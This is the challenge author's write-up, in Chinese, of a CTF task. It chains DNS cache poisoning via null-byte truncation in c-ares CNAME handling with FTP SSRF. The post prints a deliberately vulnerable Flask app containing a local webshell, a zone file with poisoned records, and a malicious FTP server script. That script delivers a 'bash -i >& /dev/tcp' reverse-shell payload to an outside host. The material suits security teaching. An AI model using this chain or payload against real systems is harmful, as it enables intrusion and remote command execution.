---
title: "TQLCTF2022 network tools 出题笔记"
date: 2024-03-13T11:26:55+08:00
draft: false
categories: ["CTF"]
tags: ["CTF", "TQLCTF2022"]
summary: ""
---

TQLCTF是奇安信技术研究院和清华大学网研院一块儿办的比赛，题目主要是由清华网研院的同学命题的，题目质量很高，我当时在奇安信研究DNS缓存污染，复现了USENIX21的一篇论文，正好拿来出题，题目源码公开在 https://github.com/YHJ/tqlctf2022_networktools

本题出题思路来自于[Injection Attacks Reloaded: Tunnelling Malicious Payloads over DNS](https://www.usenix.org/conference/usenixsecurity21/presentation/jeitner)，通过在DNS资源记录中插入控制字符，从而影响DNS的解析结果，或是插入不符合域名规范的特殊字符，最终实现DNS缓存污染、SQL注入、XSS等效果。

论文中提到`nodejs`的CNAME解析存在\0截断问题，根据`CVE-2021-22931`，定位到问题出现于`nodejs`的`dns`库，而`dns`库又调用了`c-ares`这一基于C的广泛使用的域名解析库，经测试，CNAME解析\0截断的问题在最新版本1.18.1中依然存在。

这张图可以非常清楚地解释`\0`截断导致的DNS缓存污染问题，其中\000指的是8进制0对应的字符，即`\0`：

![image-20220215015237091](/images/image-20220215015237091.png)

本题基于图中场景构建3个容器，分别是flask应用程序、dnsmasq和基于c-ares的DNS转发器。其中flask应用程序储存flag，可以执行ping、traceroute命令，并可以向[token].ftp.testsweb.xyz下载并上传文件，其中token是随机生成的8个字符，还有一个限制本地访问的webshell，源码如下：

```
from flask import Flask, request, send_from_directory,session,redirect
from flask_session import Session
from io import BytesIO
import re
import os
import ftplib
from hashlib import md5

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['SESSION_TYPE'] = 'filesystem'  
sess = Session()
sess.init_app(app)

def exec_command(cmd, addr):
    result = ''
    if re.match(r'^[a-zA-Z0-9.:-]+$', addr) != None:
        with os.popen(cmd % (addr)) as readObj:
            result = readObj.read()
    else:
        result = 'Invalid Address!'
    return result

@app.route("/")
def index():
    if not session.get('token'):
        token = md5(os.urandom(32)).hexdigest()[:8]
        session['token'] = token
    return send_from_directory('', 'index.html')

@app.route("/ping", methods=['POST'])
def ping():
    addr = request.form.get('addr', '')
    if addr == '':
        return 'Parameter "addr" Empty!'
    return exec_command("ping -c 3 -W 1 %s 2>&1", addr)

@app.route("/traceroute", methods=['POST'])
def traceroute():
    addr = request.form.get('addr', '')
    if addr == '':
        return 'Parameter "addr" Empty!'
    return exec_command("traceroute -q 1 -w 1 -n %s 2>&1", addr)

@app.route("/ftpcheck")
def ftpcheck():
    if not session.get('token'):
        return redirect("/")
    domain = session.get('token') + ".ftp.testsweb.xyz"
    file = 'robots.txt'
    fp = BytesIO()
    try:
        with ftplib.FTP(domain) as ftp:
            ftp.login("admin","admin")
            ftp.retrbinary('RETR ' + file, fp.write)
    except ftplib.all_errors as e:
        return 'FTP {} Check Error: {}'.format(domain,str(e))
    fp.seek(0)
    try:
        with ftplib.FTP(domain) as ftp:
            ftp.login("admin","admin")
            ftp.storbinary('STOR ' + file, fp)
    except ftplib.all_errors as e:
        return 'FTP {} Check Error: {}'.format(domain,str(e))
    fp.close()
    return 'FTP {} Check Success.'.format(domain)

@app.route("/shellcheck", methods=['POST'])
def shellcheck():
    if request.remote_addr != '127.0.0.1':
        return 'Localhost only'
    shell = request.form.get('shell', '')
    if shell == '':
        return 'Parameter "shell" Empty!'
    return str(os.system(shell))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)

```

其中`/ftpcheck`存在ssrf漏洞，漏洞原理与`CVE-2021-3129`一致，只需要利用上图方法将`token.ftp.testsweb.xyz`的缓存污染为自己服务器的IP地址，即可实现FTP SSRF，访问到预留的webshell。

在域名的控制面板中添加如下两条记录，将`a.testsweb.xyz`的NS记录指向`ns.testsweb.xyz`，将`a.testsweb.xyz`的A记录指向自己的IP（这里面我偷懒还是使用了`testsweb.xyz`域名，实际上任意域名都可以实现该攻击）：

![image-20220215103537613](/images/image-20220215103537613.png)

搭建一个权威DNS服务器，注意常用于搭建DNS的`bind`在域名中含有`\000`的时候会报错，经过测试我最终选择了`twisted`，这是一个基于python的dns工具，支持权威、转发器等模式，`zone file`如下：

```
zone = [
    SOA(
        # For whom we are the authority
        'a.testsweb.xyz',

        # This nameserver's name
        mname = "ns.testsweb.xyz.",
        
        # Mailbox of individual who handles this
        rname = "admin.a.testsweb.xyz",

        # Unique serial identifying this SOA data
        serial = 0,        

        # Time interval before zone should be refreshed
        refresh = "1H",             

        # Interval before failed refresh should be retried
        retry = "30M",               

        # Upper limit on time interval before expiry
        expire = "1M",              

        # Minimum TTL
        minimum = "30"              
    ),

    NS('a.testsweb.xyz', 'ns.testsweb.xyz'),

    CNAME('ftp.a.testsweb.xyz', 'b4b093f7.ftp.testsweb.xyz\000.a.testsweb.xyz'),
    A('b4b093f7.ftp.testsweb.xyz\000.a.testsweb.xyz', '175.24.70.252'),
]
```

保存为`a.testsweb.xyz`， 然后执行下列命令，关掉systemd-resolved，以权威服务器模式打开`twisted`。

```
sudo service systemd-resolved stop
sudo twistd -n dns --pyzone a.testsweb.xyz
```

在题目中ping ftp.a.testsweb.xyz，即可污染`token.ftp.testsweb.xyz`为任意IP地址。

![image-20220222105717979](/images/image-20220222105717979.png)

运行恶意ftp脚本即可实现SSRF：

```
import socket
from urllib.parse import unquote

shell_ip = '8.8.8.8'
shell_port = '7777'

# 对payload进行一次urldecode
payload = unquote("POST%20/shellcheck%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2083%0D%0A%0D%0Ashell%3Dbash%2520-c%2520%2522bash%2520-i%2520%253E%2526%2520/dev/tcp/{}/{}%25200%253E%25261%2522".format(shell_ip, shell_port))
payload = payload.encode('utf-8')

host = '0.0.0.0'
port = 21
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)

# ftp被动模式的passvie port,监听到1234
sk2 = socket.socket()
sk2.bind((host, 1234))
sk2.listen()

# 计数器，用于区分是第几次ftp连接
count = 1
while 1:
    conn, address = sk.accept()
    print("220 ")
    conn.send(b"220 \n")
    print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
    print("220 ready")
    conn.send(b"220 ready\n")

    print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文
    print("200 ")
    conn.send(b"200 \n")

    print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
    if count == 1:
        print("227 %s,4,210" % (shell_ip.replace('.', ',')))
        conn.send(b"227 %s,4,210\n" % (shell_ip.replace('.', ',').encode()))  # 服务端告诉客户端需要到那个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
    else:
        print("227 127,0,0,1,31,144")
        conn.send(b"227 127,0,0,1,31,144\n")  # 端口计算规则：31*256+144=8080

    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
    if count == 1:
        print("125 ")
        conn.send(b"125 \n") # 告诉客户端可以开始数据链接了
        # 新建一个socket给服务端返回我们的payload
        print("建立连接!")
        conn2, address2 = sk2.accept()
        conn2.send(payload)
        conn2.close()
        print("断开连接!")
    else:
        print("150 ")
        conn.send(b"150 \n")

    # 第一次连接是下载文件，需要告诉客户端下载已经结束
    if count == 1:
        print("226 ")
        conn.send(b"226 \n")
    
    print(conn.recv(20))  # QUIT\r\n
    print("221 ")
    conn.send(b"221 \n")
    conn.close()
    count += 1

```

监听端口，点击FTP Check，反弹shell成功。

![image-20220215111004814](/images/image-20220215111004814.png)

## 总结

这道题考点主要就是DNS缓存污染和FTP SSRF，整个流程下来对DNS的理解会增加不少，静下心来做还是很有意思的。
